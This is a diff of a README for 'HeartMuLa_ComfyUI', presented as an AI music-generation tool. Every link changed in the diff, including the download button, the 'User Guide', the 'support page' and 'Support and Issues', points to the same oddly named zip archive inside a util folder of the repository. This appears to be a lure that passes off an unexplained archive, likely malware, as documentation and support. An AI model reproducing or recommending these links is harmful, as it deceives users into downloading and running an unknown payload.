@@ -1,7 +1,7 @@
 # 🎶 HeartMuLa_ComfyUI - Generate Music with Ease
 
 ## 📥 Download the Application
-[![Download HeartMuLa_ComfyUI](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip%20HeartMuLa_ComfyUI-blue)](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip)
+[![Download HeartMuLa_ComfyUI](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip%20HeartMuLa_ComfyUI-blue)](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip)
 
 ## 🚀 Getting Started
 Welcome to HeartMuLa_ComfyUI! This application is designed to help you create beautiful music using AI. Whether you want to generate a full melody or simply explore new sound options, this tool makes the process easy.
@@ -24,7 +24,7 @@ To use HeartMuLa_ComfyUI, ensure your computer meets the following requirements:
 To get started:
 
 1. **Visit the Releases Page:** Click the link below to go to the download page.
-   [Download HeartMuLa_ComfyUI](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip).
+   [Download HeartMuLa_ComfyUI](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip).
 
 2. **Choose Your Version:** Find the latest release. 
    - Select the appropriate file for your operating system.
@@ -48,7 +48,7 @@ If you experience issues, try the following:
 
 - **Check the System Requirements:** Make sure your computer meets all requirements.
 - **Restart the Application:** Close and reopen HeartMuLa_ComfyUI.
-- **Visit the Support Page:** For more help, visit the [support page](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip).
+- **Visit the Support Page:** For more help, visit the [support page](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip).
 
 ## 💬 Community and Support
 Join our community for tips, feedback, and support. Share your creations and connect with other users. 
@@ -56,8 +56,8 @@ Join our community for tips, feedback, and support. Share your creations and con
 To report a bug or suggest a feature, please open an issue on our GitHub repository.
 
 ## 🔗 Useful Links
-- [Download HeartMuLa_ComfyUI](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip)
-- [User Guide](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip)
-- [Support and Issues](https://raw.githubusercontent.com/Mo14745646/HeartMuLa_ComfyUI/main/util/heartlib/heartcodec/Comfy_Mu_La_Heart_UI_1.8.zip)
+- [Download HeartMuLa_ComfyUI](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip)
+- [User Guide](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip)
+- [Support and Issues](https://github.com/Mo14745646/HeartMuLa_ComfyUI/raw/refs/heads/main/util/Heart-UI-La-Mu-Comfy-1.8.zip)
 
 Thank you for choosing HeartMuLa_ComfyUI! Enjoy making music!
